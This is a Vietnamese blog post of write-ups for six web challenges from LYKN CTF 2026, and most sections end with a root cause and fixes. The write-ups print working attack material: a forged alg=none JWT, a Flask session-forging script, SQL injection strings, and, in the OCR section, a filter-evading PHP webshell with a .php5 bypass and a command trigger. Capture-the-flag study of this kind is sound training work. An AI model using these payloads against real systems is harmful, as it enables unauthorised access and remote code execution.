---
title: "Web Challenge Writeups - LYKN CTF 2026"
date: 2026-07-08 00:00:00 +0700
categories: [Web Security, CTF Writeups]
tags: [lyknctf, web, ctf, writeup]
toc: true
---

> Tổng hợp 6 write-up web challenge trong LYKN CTF 2026.

## Index

| # | Challenge |
|---|---|
| 1 | [Discord Nitro](#discord-nitro) |
| 2 | [Freebie](#freebie) |
| 3 | [LYKN Corp](#lykn-corp) |
| 4 | [OCR](#ocr) |
| 5 | [Right in front of your eyes](#right-in-front-of-your-eyes) |
| 6 | [Waguri1](#waguri1) |

---

<a id="discord-nitro"></a>

# Discord Nitro - Writeup

## Tổng quan

Challenge là một trang **Members Area** đơn giản có form đăng nhập. Mục tiêu của mình là leo quyền từ tài khoản thường lên quyền admin để đọc flag trong trang `/admin`.

![Giao diện challenge](/assets/img/20260708-web-challenge-writeups-lykn-ctf-2026/discord-nitro/chall.png)

Ngay ở màn hình login, challenge cho sẵn tài khoản demo:

```text
guest / guest
```

![Form login](/assets/img/20260708-web-challenge-writeups-lykn-ctf-2026/discord-nitro/login.png)

## Các hướng đi mình đã thực hiện

### 1. Đăng nhập bằng tài khoản demo

Đầu tiên mình thử đăng nhập bằng tài khoản `guest / guest`. Sau khi đăng nhập thành công, server redirect mình về `/home`.

Tại đây trang hiển thị role hiện tại là `user`, đồng thời có một gợi ý khá rõ:

```text
Your session is stored in the token cookie (a JWT).
```

Điều này cho thấy trạng thái đăng nhập và phân quyền đang được lưu trong cookie `token` dưới dạng JWT.

![Đăng nhập guest và thấy JWT cookie](/assets/img/20260708-web-challenge-writeups-lykn-ctf-2026/discord-nitro/login_guest_jwt.png)

### 2. Kiểm tra trang admin

Từ trang home có nút dẫn tới `/admin`. Khi truy cập với tài khoản `guest`, server trả về thông báo `Access denied` vì role hiện tại chỉ là `user`.

Ở trang này challenge cũng nhắc thêm:

```text
Hint: the token cookie decides who you are. Is it really secure?
```

Từ đây mình tập trung vào JWT, vì nếu server tin hoàn toàn vào dữ liệu trong token thì chỉ cần sửa role thành `admin` là có thể vượt qua kiểm tra phân quyền.

### 3. Phân tích JWT

JWT ban đầu có dạng gồm 3 phần:

```text
header.payload.signature
```

Khi decode token của user `guest`, mình thấy payload chứa thông tin tương tự:

```json
{
  "user": "guest",
  "role": "user"
}
```

Header của token sử dụng thuật toán `HS256`, nghĩa là server kỳ vọng token được ký bằng HMAC SHA-256.

![Decode JWT](/assets/img/20260708-web-challenge-writeups-lykn-ctf-2026/discord-nitro/jwt.png)

Lúc này mình có một vài hướng thử:

- Thử sửa payload trực tiếp từ `role: user` thành `role: admin`, nhưng nếu signature được kiểm tra đúng thì token sẽ invalid.
- Thử brute-force secret ký JWT nếu secret yếu.
- Thử lỗi `alg=none`, tức là đổi thuật toán ký thành `none` và bỏ phần signature.

Hướng `alg=none` là hướng mình thử trước vì challenge đã gợi ý mạnh rằng cookie JWT quyết định danh tính người dùng.

### 4. Forge JWT với `alg=none`

Mình tạo lại JWT với header:

```json
{
  "alg": "none",
  "typ": "JWT"
}
```

Payload được đổi thành:

```json
{
  "user": "admin",
  "role": "admin"
}
```

Token sau khi encode base64url sẽ có dạng:

```text
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.
```

Điểm quan trọng là token vẫn có dấu chấm cuối cùng, nhưng phần signature để trống vì `alg=none`.

Sau đó mình set cookie `token` bằng JWT vừa forge và truy cập lại `/admin`.

### 5. Lấy flag

Server chấp nhận token `alg=none`, tin payload bên trong và coi mình là admin. Khi vào `/admin`, flag được hiển thị trực tiếp:

![Get flag](/assets/img/20260708-web-challenge-writeups-lykn-ctf-2026/discord-nitro/get_flag.png)

Flag:

```text
LYKNCTF{f1b14de2746c4fe0b8194b8ce9a96c9d}
```

## Nguyên nhân lỗi

Lỗi chính của challenge là server chấp nhận JWT có thuật toán `none`. Điều này làm mất hoàn toàn ý nghĩa của chữ ký JWT, vì attacker có thể tự tạo token mới với bất kỳ payload nào mà không cần biết secret.

Trong trường hợp này, server còn dùng field `role` trong JWT để quyết định quyền truy cập admin. Vì vậy khi mình đổi `role` từ `user` sang `admin`, mình có thể bypass authorization.

## Cách khắc phục

Một số cách fix:

- Không bao giờ chấp nhận `alg=none` trong môi trường production.
- Khi verify JWT, server phải hard-code danh sách thuật toán hợp lệ, ví dụ chỉ cho phép `HS256` hoặc `RS256`.
- Không tin thuật toán do client gửi lên trong JWT header một cách mù quáng.
- Dùng secret đủ mạnh nếu dùng HMAC.
- Với các quyền quan trọng như admin, nên kiểm tra lại role từ database hoặc backend session thay vì tin hoàn toàn vào dữ liệu client nắm giữ.

## Kết luận

Challenge này là một bài JWT authorization bypass khá trực diện. Luồng khai thác của mình là: đăng nhập demo, kiểm tra cookie JWT, decode payload, thử forge token với `alg=none`, set lại cookie và truy cập `/admin` để lấy flag.

---

<a id="freebie"></a>

# Freebie - Writeup

![Challenge info](/assets/img/20260708-web-challenge-writeups-lykn-ctf-2026/freebie/chall.png)

## Thông tin challenge

- Tên challenge: **Freebie**
- Điểm: **500**
- Tác giả: **nuts727**
- Mô tả: **Human error is the weakest link.**
- Category: **Web**

Ở bài này, mình được cung cấp một web app Flask đơn giản. Giao diện ban đầu có hai chức năng chính:

- `Authenticate` trỏ tới `/login`
- `View Classified` trỏ tới `/flag`

Mục tiêu là truy cập được khu vực classified với quyền `admin`.

## Recon ban đầu

Mình bắt đầu bằng cách kiểm tra các route chính:

```bash
curl http://<instance>:8080/
curl http://<instance>:8080/login
curl http://<instance>:8080/register
curl http://<instance>:8080/flag
```

Trang chủ chỉ có link tới `/login` và `/flag`. Khi truy cập `/flag` mà chưa đăng nhập, server redirect về `/login`.

Sau đó mình thử đăng ký một user thường, đăng nhập, rồi vào `/flag`. Kết quả là đăng nhập thành công nhưng vẫn bị chặn:

```text
ACCESS DENIED
Hello, <username>. This section is locked.
Only admin can view this page.
```

Điều này cho thấy session sau login chỉ có quyền user thường, còn `/flag` yêu cầu session có `username = admin`.

## Các hướng mình đã thử

### 1. Đăng ký tài khoản admin

Mình thử đăng ký username là `admin`, nhưng app chặn trực tiếp:

```text
Error: Registration for the 'admin' account is prohibited.
```

Tiếp theo mình thử một số biến thể như:

- `Admin`
- `ADMIN`
- `admin `
- ` admin`
- `admin%00`
- `admin\t`
- `admin\n`

Các username này có thể đăng ký trong một vài trường hợp, nhưng khi vào `/flag` vẫn bị chặn vì server kiểm tra chính xác chuỗi `admin`.

### 2. Đăng nhập admin trực tiếp

Mình thử login bằng `admin` với một số password phổ biến như:

```text
admin
password
123456
admin123
secret
nuts727
freebie
```

Nhưng route `/login` chặn admin trước khi kiểm tra password:

```text
Error 403: Admin login via web interface is disabled.
```

### 3. Thử bypass qua HTTP parameter pollution

Mình thử gửi nhiều field `username` trong cùng request, ví dụ:

```http
username=test&username=admin&password=123
```

Nhưng Flask lấy giá trị đầu tiên, session vẫn là user thường nên không bypass được.

### 4. Thử SQL injection

Mình thử các payload cơ bản ở cả `username` và `password`, ví dụ:

```text
admin'--
' OR '1'='1'--
' OR username='admin'--
```

Không có dấu hiệu SQL injection. App có vẻ đang dùng một dictionary trong memory thay vì database.

### 5. Thử forge Flask session

Sau khi login bằng user thường, cookie session có dạng Flask signed session:

```text
session=<payload>.<timestamp>.<signature>
```

Payload decode ra kiểu:

```json
{ "username": "normal_user" }
```

Nếu có được Flask `secret_key`, mình có thể ký lại session thành:

```json
{ "username": "admin" }
```

Ban đầu mình thử crack secret key bằng một số wordlist và các biến thể theo tên challenge, nhưng chưa ra. Lúc này mình quay lại tìm leak trong app.

## Lỗ hổng chính: debug parameter leak source code

Clue của đề là:

```text
Human error is the weakest link.
```

Mình thử thêm các parameter debug phổ biến vào `/flag`, đặc biệt là:

```http
/flag?debug=1
```

Kết quả server trả về toàn bộ source code của app.

![Leak secret key](/assets/img/20260708-web-challenge-writeups-lykn-ctf-2026/freebie/leak_secretkey.png)

Trong source có đoạn quan trọng:

```python
@app.before_request
def before_request():
    if "debug" in request.args:
        try:
            with open(__file__, 'r') as f:
                source_code = f.read()
            return f"<body style='background:#1e1e1e; color:#d4d4d4;'><pre>{source_code}</pre></body>"
        except Exception as e:
            print(f"Error reading file: {e}")
```

Dev để lại một debug backdoor: chỉ cần request có query parameter `debug`, app sẽ đọc chính file source hiện tại và trả về cho client.

Trong source cũng lộ luôn Flask secret key:

```python
app.secret_key = "sup3r_s3cr3t_ctf_k3y_727"
```

Đây chính là lỗi “human error”.

## Forge Flask session admin

Flask session cookie được ký bằng `itsdangerous`, cụ thể qua `SecureCookieSessionInterface`.

Mình dùng secret key bị leak để tạo session mới:

```python
from flask import Flask
from flask.sessions import SecureCookieSessionInterface

app = Flask(__name__)
app.secret_key = "sup3r_s3cr3t_ctf_k3y_727"

s = SecureCookieSessionInterface().get_signing_serializer(app)
cookie = s.dumps({"username": "admin"})

print(cookie)
```

Cookie tạo ra:

```text
session=eyJ1c2VybmFtZSI6ImFkbWluIn0.akuzCg.9feqZfnrDZ56QD62EBeYl5eki4Q
```

Sau đó mình truy cập vào `/flag` với cookie này. Server nhận session `username=admin`, nên trả về flag.

![Get flag](/assets/img/20260708-web-challenge-writeups-lykn-ctf-2026/freebie/get_flag.png)

## Flag

```text
LYKNCTF{4aabdc6089b348739faed2b7e5062b56}
```

## Tổng kết

Luồng khai thác của mình:

1. Recon các route `/`, `/login`, `/register`, `/flag`.
2. Xác định `/flag` yêu cầu session có `username = admin`.
3. Thử đăng ký/login admin nhưng bị chặn.
4. Thử các bypass username, parameter pollution, SQLi, forge session bằng wordlist nhưng không thành công.
5. Tìm thấy `/flag?debug=1` leak source code.
6. Lấy được `app.secret_key`.
7. Dùng secret key ký Flask session với `{"username":"admin"}`.
8. Gửi cookie admin tới `/flag` và lấy flag.

Lỗi gốc nằm ở việc developer để lại debug feature trong production. Chỉ một query parameter `debug` đã làm lộ source code, secret key, và toàn bộ logic auth của app.

---

<a id="lykn-corp"></a>

# LYKN Corp - Web Challenge Writeup

![Challenge](/assets/img/20260708-web-challenge-writeups-lykn-ctf-2026/lykn-corp/chall.png)

## Tổng quan

Challenge cho mình một hệ thống mail nội bộ của **LYKN Corp**. Mô tả bài nhấn vào việc công ty vừa ra mắt một onboarding portal cho nhân viên mới, nên hướng suy nghĩ ban đầu của mình là tìm credential mặc định hoặc dữ liệu onboarding bị lộ.

Mục tiêu cuối cùng là vào được trang admin và lấy flag.

Flag:

```txt
LYKNCTF{46df3db3feab44738e0e820507b8b423}
```

![Flag](/assets/img/20260708-web-challenge-writeups-lykn-ctf-2026/lykn-corp/getflag.png)

## Recon ban đầu

Mình mở trang chính thì thấy một form login đơn giản của **LYKN Mail**.

Các route rõ ràng ban đầu:

```txt
/
/login
/static/style.css
```

Sau đó mình thử kiểm tra xem server có tồn tại file `robots.txt` không:

Kết quả:

```txt
User-agent: *
Disallow: /backup
```

![Robots](/assets/img/20260708-web-challenge-writeups-lykn-ctf-2026/lykn-corp/robots.png)

Đây là hint khá trực tiếp: có thư mục backup bị giấu.

## Hướng `/backup`, dirsearch và lỗi case-sensitive

Sau khi thấy `robots.txt` leak `/backup`, mình thử mở trực tiếp đường dẫn này trên browser nhưng bị chặn `403 Forbidden`. Mình cũng thử các dạng khác như `bAckup`, `BACKUP`, `bAcKup`... Nhưng không có tiến triển gì vì vậy mình chuyển sang brute-force directory bằng `dirsearch`:

```bash
dirsearch -u http://<instance>:8080/
```

Kết quả đáng chú ý là `/Backup` chữ hoa lại trả `200`. Có vẻ trong quá trình thử bypass thì mình quên case đơn giản nhất là `Backup`:

![Dirsearch Backup](/assets/img/20260708-web-challenge-writeups-lykn-ctf-2026/lykn-corp/dirsearch_backup.png)

Từ đây mình biết vấn đề nằm ở case-sensitive path. Rule chặn của nginx áp vào `/backup` chữ thường, nhưng `/Backup` chữ hoa không bị chặn.

Sau đó mình mở `/Backup` trực tiếp trên browser. Vì URL thiếu dấu `/` cuối, server tự redirect sang port `2413`:

```txt
http://<instance>:2413/Backup/
```

Browser báo không truy cập được port này:

![Browser 2413](/assets/img/20260708-web-challenge-writeups-lykn-ctf-2026/lykn-corp/browser_2413.png)

Đoạn `2413` này là một port bị leak qua redirect, không phải hướng khai thác chính. Mình chỉ cần quay lại browser và mở đúng path có dấu `/` cuối trên port ban đầu:

```txt
http://<instance>:8080/Backup/
```

Lúc này directory listing hiện ra và có file `credentials.txt`:

![Backup Directory](/assets/img/20260708-web-challenge-writeups-lykn-ctf-2026/lykn-corp/Backup_credential.png)

## Lấy credential nhân viên mới

Ở trang directory listing `/Backup/`, mình truy cập vào file `credentials.txt` trên browser:

```txt
http://<instance>:8080/Backup/credentials.txt
```

Thành công có được credential của user `tuan.nguyen`

![Credentials](/assets/img/20260708-web-challenge-writeups-lykn-ctf-2026/lykn-corp/cred.png)

Vậy bug ở bước này là:

- `robots.txt` leak `/backup`.
- `/backup` chữ thường bị nginx chặn.
- `/Backup/` chữ hoa không bị rule chặn do path matching case-sensitive.
- Directory listing bật, để lộ `credentials.txt`.

## Login bằng account Tuan

Mình dùng credential vừa lấy được để login:

```txt
Username: tuan.nguyen
Password: Welcome123!
```

![Login Tuan](/assets/img/20260708-web-challenge-writeups-lykn-ctf-2026/lykn-corp/login_tuanngueyn.png)

Sau khi login, inbox chỉ có một mail onboarding từ `minh.le@lykn.local`. Mail này chủ yếu là checklist tuần đầu, chưa có flag hay credential admin.

Ở đây mình từng làm một bài có sử dụng mật khẩu mặc định cho mọi user nên ngay lập tức mình thử theo hướng password reuse. Vì password onboarding là `Welcome123!`, mình thử cùng password đó với user đã xuất hiện trong mail là `minh.le`.

## Password reuse sang Minh Le

Credential tiếp theo:

```txt
Username: minh.le
Password: Welcome123!
```

Đăng nhập thành công vào mailbox của Minh. Trong inbox Minh có mail từ admin với subject:

```txt
Re: Portal access — server maintenance tonight
```

Nội dung mail chứa service account để kiểm tra monitoring dashboard:

```txt
Username: admin
Password: Adm1n_S3cur3_P@ss_2026
```

![Login Minh](/assets/img/20260708-web-challenge-writeups-lykn-ctf-2026/lykn-corp/login_minhle.png)

Thành công leo tiếp từ account nhân viên mới sang account có thông tin admin.

## Login admin và lấy flag

Mình login bằng credential admin:

```txt
Username: admin
Password: Adm1n_S3cur3_P@ss_2026
```

Sau khi vào `/admin`, trang hiển thị challenge completed và flag:

```txt
LYKNCTF{46df3db3feab44738e0e820507b8b423}
```

![Get Flag](/assets/img/20260708-web-challenge-writeups-lykn-ctf-2026/lykn-corp/getflag.png)

## Các hướng mình đã thử

Trong quá trình làm, mình có thử một số hướng khác trước khi chốt flow chính:

- Thử login mặc định như `admin:admin`, `admin:password`, nhưng không thành công.
- Thử SQLi ở form login, nhưng không thành công.
- Thử truy cập trực tiếp `/admin`, `/dashboard`, `/compose`, `/sent`, `/trash`; tất cả đều cần session.
- Thử `/backup` chữ thường và các biến thể backup phổ biến, đa số bị `403` do nginx chặn prefix.
- Thử đọc CSS để xem app có route nào lộ không. CSS xác nhận có webmail, admin page, compose, sent/trash, flag card, nhưng không có secret trực tiếp.
- Thử IDOR `/email/<id>` bằng account Tuan nhưng không đọc được mail user khác.

## Root cause

Challenge này có chuỗi lỗi khá thực tế:

1. `robots.txt` leak đường dẫn nhạy cảm.
2. Nginx chặn `/backup` nhưng rule bị bypass bằng khác biệt chữ hoa/thường: `/Backup/`.
3. Directory listing được bật trên thư mục backup.
4. File backup chứa credential nhân viên mới.
5. Password onboarding bị reuse cho user nội bộ khác.
6. Mailbox nội bộ chứa credential admin plaintext.

## Bài học rút ra

- Không để thông tin nhạy cảm trong `robots.txt`; nó chỉ là chỉ dẫn cho crawler, không phải cơ chế bảo vệ.
- Rule chặn path nên xử lý normalize/case một cách rõ ràng, đặc biệt khi dùng nginx làm reverse proxy/static server.
- Không bật directory listing cho thư mục backup.
- Không lưu credential plaintext trong mail nội bộ.
- Không reuse password onboarding giữa nhiều account.

---

<a id="ocr"></a>

# OCR - Writeup

## Tổng quan

Challenge **OCR** là một web app nhỏ tên **OCR Note Saver**. App cho mình vẽ chữ lên canvas, gửi ảnh PNG lên server để OCR bằng Tesseract, sau đó cho lưu phần text OCR thành một note trên server.

![Challenge info](/assets/img/20260708-web-challenge-writeups-lykn-ctf-2026/ocr/Screenshot%202026-07-06%20213038.png)

Điểm đáng chú ý ngay từ mô tả và giao diện là app có chức năng **save server-side note**. Vì note được lưu với filename do người dùng nhập, hướng mình nghĩ tới đầu tiên là thử ghi file vào web root, sau đó tìm cách biến note thành file thực thi.

## Recon ban đầu

Mình bắt đầu bằng cách thử luồng bình thường:

1. Vẽ vài chữ đơn giản lên form OCR.
2. Server trả về phần **Recognized Text** kèm form lưu file.
3. Form lưu có input `filename`, mặc định là `note.txt`.
4. Sau khi lưu, app báo file nằm trong thư mục `/saved/`.

Khi lưu text bình thường thành `note.txt`, mình có thể đọc lại file qua:

```text
/saved/note.txt
```

Điều này xác nhận thư mục `saved/` nằm trong web-accessible path.

## Kiểm tra filter filename

Mình fuzz nhanh một số extension để xem app chặn gì:

```text
a.php      -> blocked
a.phtml    -> blocked
a.phar     -> blocked
a.inc      -> blocked
a.php.txt  -> allowed
a.php5     -> allowed
a.pht      -> allowed
note.txt   -> allowed
```

Chi tiết quan trọng là `.php` bị chặn, nhưng `.php5` lại được cho phép. Vì phần release notes có nhắc **Legacy note compatibility enabled**, mình nghi server vẫn cấu hình PHP handler cho extension cũ như `.php5`.

Mình test payload đơn giản:

```php
<?PHP echo 777; ?>
```

Lưu thành:

```text
u1.php5
```

Khi mở:

```text
/saved/u1.php5
```

server trả về:

```text
777
```

Vậy là `.php5` được execute thật.

## Kiểm tra filter nội dung

Filter nội dung không chỉ chặn extension, mà còn chặn một số token nguy hiểm. Các payload như sau bị chặn:

```php
<?php echo 1; ?>
<script>
eval(...)
system(...)
passthru(...)
```

Nhưng filter có điểm yếu:

- Chặn `<?php` dạng lowercase, nhưng không chặn `<?PHP` uppercase.
- Chặn keyword `system` khi viết liền, nhưng mình có thể tách chuỗi thành `'sys'.'tem'`.
- PHP cho phép gọi hàm qua biến, ví dụ `$f('id')` nếu `$f = 'system'`.

Payload RCE bypass filter:

```php
<?PHP $f='sys'.'tem';$f('id');
```

Payload này ngắn, không cần đóng `?>`, và vẫn hợp lệ vì PHP parse tới EOF.

## Vấn đề giới hạn OCR

Một vấn đề nhỏ là app/OCR chỉ nhận payload ngắn ổn định, khoảng 40 ký tự. Vì vậy mình rút payload xuống còn:

```php
<?PHP $f='sys'.'tem';$f($_GET[0]);
```

Payload này khoảng 34 ký tự và biến file `.php5` thành một webshell nhận command qua query parameter `0`.

## Ghi payload vào canvas bằng DevTools

Thay vì vẽ tay, mình dùng DevTools Console để ghi text trực tiếp lên canvas. Cách này giúp OCR đọc chính xác hơn.

```js
clearCanvas();
ctx.fillStyle = "#fff";
ctx.fillRect(0, 0, c.width, c.height);
ctx.fillStyle = "#000";
ctx.font = "38px Consolas";
ctx.fillText("<?PHP $f='sys'.'tem';$f($_GET[0]);", 20, 130);
sendCanvas();
```

![DevTools canvas payload](/assets/img/20260708-web-challenge-writeups-lykn-ctf-2026/ocr/Screenshot%202026-07-06%20215846.png)

Sau khi OCR xong, mình kiểm tra lại phần recognized text. Nếu OCR đúng, mình nhập filename là:

```text
shell.php5
```

và bấm **Save note**.

![Save php5 shell](/assets/img/20260708-web-challenge-writeups-lykn-ctf-2026/ocr/Screenshot%202026-07-06%20215737.png)

## Khai thác RCE

Sau khi lưu thành công, shell nằm tại:

```text
/saved/shell.php5
```

Vì payload dùng `$_GET[0]`, mình truyền command qua parameter `0`.

Test RCE:

```text
/saved/shell.php5?0=id
```

Đọc flag:

```text
/saved/shell.php5?0=cat%20/flag*
```

Kết quả trả về flag:

![Flag](/assets/img/20260708-web-challenge-writeups-lykn-ctf-2026/ocr/Screenshot%202026-07-06%20215805.png)

```text
LYKNCTF{d7dfc7f5445b43ea8272243129bcd02f}
```

## Tóm tắt bug

Root cause của challenge là kết hợp nhiều lỗi nhỏ:

1. App cho lưu OCR output vào file trong web root.
2. Filename filter chặn `.php` nhưng bỏ sót `.php5`.
3. Server vẫn execute `.php5` do legacy PHP handler.
4. Content filter blacklist theo chuỗi, có thể bypass bằng `<?PHP` uppercase và tách chuỗi `'sys'.'tem'`.
5. OCR có thể bị điều khiển ổn định bằng cách ghi text trực tiếp lên canvas qua JavaScript.

Payload cuối cùng:

```php
<?PHP $f='sys'.'tem';$f($_GET[0]);
```

Filename:

```text
shell.php5
```

Trigger:

```text
/saved/shell.php5?0=cat%20/flag*
```

---

<a id="right-in-front-of-your-eyes"></a>

# Right in front of your eyes - Writeup

![Thông tin challenge](/assets/img/20260708-web-challenge-writeups-lykn-ctf-2026/right-in-front-of-your-eyes/chall.png)

## Tổng quan

Challenge có tên **Right in front of your eyes**. Nhìn vào mô tả/hint thì ý chính là thứ mình cần tìm đang ở "ngay trước mắt", nhưng nếu chỉ xem giao diện trên trình duyệt thì khá dễ bỏ qua.

Trong ảnh thông tin challenge, hint ghi:

> You just walked right past it without even realizing it existed... or maybe it never did.

Hint này làm mình nghĩ đến việc có một thông tin nào đó đã xuất hiện trong quá trình request/response, nhưng trình duyệt có thể đã xử lý quá nhanh nên mình không nhìn thấy trực tiếp.

## Quan sát trang web

![Trang chủ](/assets/img/20260708-web-challenge-writeups-lykn-ctf-2026/right-in-front-of-your-eyes/home.png)

Khi mở link challenge, trang web chỉ hiển thị một nội dung rất đơn giản:

```text
It in front of your eyes
But you can't see it
```

Ban đầu mình thử đi theo các hướng quen thuộc khi gặp một web challenge đơn giản:

- Mình check source HTML của trang để xem có comment, hidden input, script lạ, hoặc đường dẫn ẩn nào không.
- Mình kiểm tra cookie trên browser để xem server có set giá trị đặc biệt nào không.
- Mình xem qua các thông tin hiển thị trên trang, nhưng giao diện quá đơn giản và không có thêm chức năng để tương tác.

Kết quả là các hướng này không đem lại gì đáng chú ý. Source và cookie đều không có flag hay manh mối rõ ràng.

## Xem request/response bằng Burp Suite

Vì hint nhấn mạnh việc mình đã "đi ngang qua" thứ cần tìm, mình chuyển sang bắt request bằng Burp Suite để xem kỹ hơn từng response mà browser nhận được.

![Response chứa flag trong Burp Suite](/assets/img/20260708-web-challenge-writeups-lykn-ctf-2026/right-in-front-of-your-eyes/get_flag.png)

Trong Burp Suite, khi gửi request `GET /`, server trả về response:

```http
HTTP/1.1 302 Found
Content-Type: text/plain; charset=utf-8
Location: /?
Server: Python/3.12 aiohttp/3.14.1
```

Điều quan trọng nằm ở body của response `302 Found`. Burp hiển thị rõ:

```text
Well done! You never expect this page to be here, right?
Here is the flag: LYKNCTF{10a266abc8d4042aa022bef07c92a4}
```

Đây là lý do nếu chỉ dùng browser bình thường thì mình rất dễ bỏ qua. Browser tự động follow redirect `302`, nên response trung gian chứa flag không được hiển thị trên giao diện cuối cùng.

## Kết luận

Challenge này không cần khai thác phức tạp. Hướng đúng là quan sát luồng HTTP thật sự thay vì chỉ nhìn giao diện cuối cùng trên browser.

Flag:

```text
LYKNCTF{10a266abc8d4042aa022bef07c92a4}
```

---

<a id="waguri1"></a>

# Waguri1 / Spawn Race Writeup

## Thông tin challenge

- **Challenge:** Waguri1 / Spawn Race
- **Category:** Web
- **Flag:** `LYKNCTF{92c27df6f37b463fab76e5ee8c1069cd}`

![Giao diện challenge](/assets/img/20260708-web-challenge-writeups-lykn-ctf-2026/waguri1/chall.png)

## Tổng quan

Khi vào challenge, mình thấy trang chỉ có chức năng chính là bấm nút **SPAWN** để spawn ra ảnh kèm âm thanh. Thoạt nhìn thì hướng đầu tiên khá tự nhiên là kiểm tra source HTML/JavaScript xem nút này gửi request gì, endpoint nào xử lý, hoặc có dữ liệu nào bị giấu trong frontend không.

Tuy nhiên sau khi đọc source, mình nhận ra nút **SPAWN** không gửi HTTP request thông thường. Thay vào đó, frontend giao tiếp với server bằng **WebSocket**.

```js
const socket = new WebSocket(`${protocol}//${window.location.host}`);
```

Khi người dùng bấm nút, client chỉ gửi một message JSON rất đơn giản lên server:

```js
socket.send(JSON.stringify({ type: "spawn" }));
```

Điều này làm mình chuyển hướng từ việc tìm endpoint HTTP sang quan sát trực tiếp dữ liệu WebSocket.

## Phân tích frontend

Tiếp tục đọc phần xử lý message trả về từ server, mình thấy frontend parse dữ liệu JSON và chỉ render ảnh + âm thanh khi message có dạng `spawned`:

```js
if (message.type === "spawned" && message.image && message.sound) {
  showSpawn(message.image, message.sound);
}
```

Điểm đáng chú ý ở đây là frontend chỉ dùng các field `type`, `image`, `sound` để hiển thị lên giao diện. Nếu server trả về thêm field khác, ví dụ như `flag`, thì giao diện cũng sẽ không hiện ra.

Vì vậy, mình không nên chỉ nhìn những gì được render trên trang. Hướng đúng hơn là phải xem **raw WebSocket message** server gửi về.

## Quan sát raw WebSocket response

Mình mở DevTools Console và gắn thêm listener để log toàn bộ dữ liệu thô nhận được từ WebSocket:

```js
socket.addEventListener("message", (e) => console.log("RAW:", e.data));
```

Sau đó mình thử gửi nhiều message `spawn` liên tục. Vì tên challenge là **Spawn Race** và đề có gợi ý kiểu “there's something behind it”, mình đoán khả năng cao challenge liên quan đến race condition hoặc logic chỉ xảy ra khi spawn đủ nhanh / đủ nhiều.

Payload mình dùng trong Console:

![script_exploit](/assets/img/20260708-web-challenge-writeups-lykn-ctf-2026/waguri1/script.png)

Đoạn script này tương đương với việc bấm nút **SPAWN** 300 lần rất nhanh, nhưng thay vì thao tác tay trên giao diện thì mình gửi trực tiếp WebSocket message.

## Lấy flag

Sau khi spam spawn, server trả về một message đặc biệt. Message này vẫn có `type: "spawned"`, vẫn có `image` và `sound`, nhưng có thêm các field quan trọng như `race`, `spawnId` và `flag`.

```json
{
  "type": "spawned",
  "image": "/images/1.gif",
  "sound": "/sounds/8.mp3",
  "spawnId": 6,
  "race": "won",
  "flag": "LYKNCTF{92c27df6f37b463fab76e5ee8c1069cd}"
}
```

![Flag trong raw WebSocket message](/assets/img/20260708-web-challenge-writeups-lykn-ctf-2026/waguri1/get_flag.png)

Flag nhận được là:

```text
LYKNCTF{92c27df6f37b463fab76e5ee8c1069cd}
```

## Kết luận

Challenge này không phải dạng tìm flag trực tiếp trong source HTML/JS. Source chỉ giúp mình nhận ra cơ chế giao tiếp thật sự là **WebSocket**.

Điểm mấu chốt là frontend không render toàn bộ dữ liệu server trả về. Server thực tế có gửi field `flag`, nhưng vì code frontend chỉ hiển thị ảnh và âm thanh nên nếu chỉ nhìn giao diện thì sẽ bỏ lỡ flag.

Hướng giải đúng là:

1. Đọc source để xác định nút **SPAWN** dùng WebSocket.
2. Gắn listener hoặc xem tab **Network → WS → Messages** để quan sát raw message.
3. Gửi nhiều message `{ type: "spawn" }` liên tục để trigger logic race.
4. Đọc raw response đặc biệt có `race: "won"` và lấy field `flag`.
